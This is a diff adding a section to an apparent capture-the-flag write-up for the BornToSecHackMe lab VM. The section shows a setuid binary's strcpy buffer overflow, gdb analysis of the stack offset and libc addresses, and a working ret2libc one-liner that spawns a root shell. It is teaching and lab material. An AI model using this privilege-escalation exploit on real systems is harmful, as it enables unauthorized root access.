@@ -538,3 +538,100 @@ exploit_me  mail
 zaz@BornToSecHackMe:~$ file exploit_me
 exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
 ```
+
+We find a small binary looking as follow :
+```c
+uint main(int ac,char **av)
+{
+  char string [140];
+  
+  if (ac > 1) {
+    strcpy(string,av[1]);
+    puts(string);
+  }
+  return (uint)(ac < 2);
+}
+
+```
+
+Like in `rainfall` or `overwrite` project, we can see that we can exploit a `bufferoverflow` here with the var string and the `strcpy`. 
+
+```bash
+zaz@BornToSecHackMe:~$ gdb -q ./exploit_me
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:     push   %ebp
+   0x080483f5 <+1>:     mov    %esp,%ebp
+   0x080483f7 <+3>:     and    $0xfffffff0,%esp
+   0x080483fa <+6>:     sub    $0x90,%esp
+   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:    jg     0x804840d <main+25>
+   0x08048406 <+18>:    mov    $0x1,%eax
+   0x0804840b <+23>:    jmp    0x8048436 <main+66>
+   0x0804840d <+25>:    mov    0xc(%ebp),%eax
+   0x08048410 <+28>:    add    $0x4,%eax
+   0x08048413 <+31>:    mov    (%eax),%eax
+   0x08048415 <+33>:    mov    %eax,0x4(%esp)
+   0x08048419 <+37>:    lea    0x10(%esp),%eax
+   0x0804841d <+41>:    mov    %eax,(%esp)
+   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:    lea    0x10(%esp),%eax
+   0x08048429 <+53>:    mov    %eax,(%esp)
+   0x0804842c <+56>:    call   0x8048310 <puts@plt>
+   0x08048431 <+61>:    mov    $0x0,%eax
+   0x08048436 <+66>:    leave
+   0x08048437 <+67>:    ret
+End of assembler dump.
+(gdb) b *main+56
+Breakpoint 1 at 0x804842c
+(gdb) r BBBB
+Starting program: /home/zaz/exploit_me BBBB
+
+Breakpoint 1, 0x0804842c in main ()
+(gdb) i f
+Stack level 0, frame at 0xbffff760:
+ eip = 0x804842c in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff758, args:
+ Locals at 0xbffff758, Previous frame's sp is 0xbffff760
+ Saved registers:
+  ebp at 0xbffff758, eip at 0xbffff75c
+(gdb) x/30x $esp
+0xbffff6c0:     0xbffff6d0      0xbffff925      0x00000001      0xb7ec3c49
+0xbffff6d0:     0x42424242      0xbffff700      0x00000000      0xb7ff3fec
+0xbffff6e0:     0xbffff794      0xb7fdd000      0x00000000      0xb7e5ec73
+0xbffff6f0:     0x08048241      0x00000000      0x00c30000      0x00000001
+0xbffff700:     0xbffff910      0x0000002f      0xbffff75c      0xb7fd0ff4
+0xbffff710:     0x08048440      0x080496e8      0x00000002      0x080482dd
+0xbffff720:     0xb7fd13e4      0x00000016      0x080496e8      0x08048461
+0xbffff730:     0xffffffff      0xb7e5edc6
+
+```
+> 0xbffff75c => EIP
+> 0xbffff6d0 => Buffer beginning
+> 0xbffff75c - 0xbffff6d0 = 140
+
+```bash
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+```
+
+> system =>0xb7e6b060
+> exit =>0xb7e5ebe0
+> /bin/sh =>0xb7f8cc58
+
+
+We can now use the `ret2libc` method to get access of the shell of the creator of the binary file. In that case root.
+
+```bash
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
+# whoami
+root
+```
